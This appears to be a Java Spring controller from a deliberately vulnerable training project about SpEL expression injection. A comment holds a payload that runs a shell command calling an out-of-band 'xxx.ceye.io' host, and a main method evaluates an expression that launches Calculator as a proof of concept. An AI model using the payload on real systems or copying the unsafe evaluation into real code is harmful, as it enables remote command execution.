package org.joychou.controller;

import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.SpelEvaluationException;
import org.springframework.expression.spel.SpelMessage;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.expression.spel.support.StandardEvaluationContext;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;


/**
 * SpEL Injection
 *
 * @author JoyChou @2019-01-17
 */
@RestController
public class SpEL {

    /**
     * SpEL to RCE
     * http://localhost:8080/spel/vul/?expression=xxx.
     * xxx is urlencode(exp)
     * exp: T(java.lang.Runtime).getRuntime().exec("curl xxx.ceye.io")
     */
    // Only allow safe property/literal expressions: alphanumeric, dots, spaces, quotes, arithmetic
    private static final java.util.regex.Pattern SPEL_SAFE_PATTERN =
            java.util.regex.Pattern.compile("^[a-zA-Z0-9_.+\\-*/ '\"]+$");

    @GetMapping("/spel/vuln")
    public String rce(String expression) {
        if (expression == null || !SPEL_SAFE_PATTERN.matcher(expression).matches()) {
            return "Expression not allowed";
        }
        ExpressionParser parser = new SpelExpressionParser();
        StandardEvaluationContext context = new StandardEvaluationContext();
        return parser.parseExpression(expression).getValue(context, String.class);
    }

    public static void main(String[] args) {
        ExpressionParser parser = new SpelExpressionParser();
        String expression = "T(java.lang.Runtime).getRuntime().exec(\"open -a Calculator\")";
        String result = parser.parseExpression(expression).getValue().toString();
        System.out.println(result);
    }
}

